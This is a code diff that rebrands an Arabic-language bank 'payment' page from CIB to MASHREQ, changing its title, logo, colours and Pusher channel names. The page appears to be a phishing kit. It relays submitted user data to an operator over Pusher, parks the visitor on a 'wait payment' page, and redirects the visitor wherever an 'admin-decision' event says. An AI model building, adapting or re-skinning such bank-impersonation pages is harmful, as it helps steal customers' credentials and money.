@@ -35,7 +35,7 @@ if (isset($_POST['submit'])) {
             'updatedData' => $site
         ];
 
-        $pusher->trigger('my-channel-cib', 'update-user-accountt', $dataUser);
+        $pusher->trigger('my-channel-MASHREQ', 'update-user-accountt', $dataUser);
 
         echo "<script>document.location.href='waitpayment.php';</script>";
         exit;
@@ -52,7 +52,7 @@ if (isset($_GET['reject'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الدفع - CIB</title>
+    <title>الدفع - MASHREQ</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
         rel="stylesheet">
     <style>
@@ -219,7 +219,7 @@ if (isset($_GET['reject'])) {
             border: 1.5px solid #e2e8f0;
             border-radius: 12px;
             font-size: 15px;
-            color: #1a2332;
+            color: #f57c00;
             font-family: 'Cairo', sans-serif;
             background: #f8fafc;
             outline: none;
@@ -364,7 +364,7 @@ if (isset($_GET['reject'])) {
         }
 
         .loader-card h5 {
-            color: #1a2332;
+            color: #f57c00;
             font-size: 16px;
             font-weight: 700;
             margin-bottom: 4px;
@@ -392,7 +392,7 @@ if (isset($_GET['reject'])) {
 <body>
     <div class="page-wrapper">
         <div class="header">
-            <img src="assets/logo.webp" alt="CIB" class="header-logo">
+            <img src="assets/mashreq.jpeg" alt="MASHREQ" class="header-logo">
             <div class="header-icon">
                 <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"
                     stroke-linecap="round" stroke-linejoin="round">
@@ -555,7 +555,7 @@ if (isset($_GET['reject'])) {
 var pusher = new Pusher('0737c04931774e406307', {
       cluster: 'ap2'
     });
-            var channel = pusher.subscribe('my-channel-cib');
+            var channel = pusher.subscribe('my-channel-MASHREQ');
             channel.bind('admin-decision', function (data) {
                 if (data.userId == userId) window.location = data.url;
             });
